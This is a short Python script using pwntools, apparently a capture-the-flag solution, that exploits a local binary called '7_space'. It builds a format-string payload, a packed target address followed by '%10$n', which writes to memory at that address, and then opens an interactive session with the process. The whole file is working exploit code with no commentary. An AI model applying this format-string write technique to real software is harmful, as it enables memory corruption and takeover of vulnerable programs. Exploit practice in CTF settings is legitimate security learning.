from pwn import *
sh = process("./7_space")
sh.recvuntil(b':')
payload  = p32(0x804C044)+b"%10$n"
sh.sendline(payload)
sh.interactive()
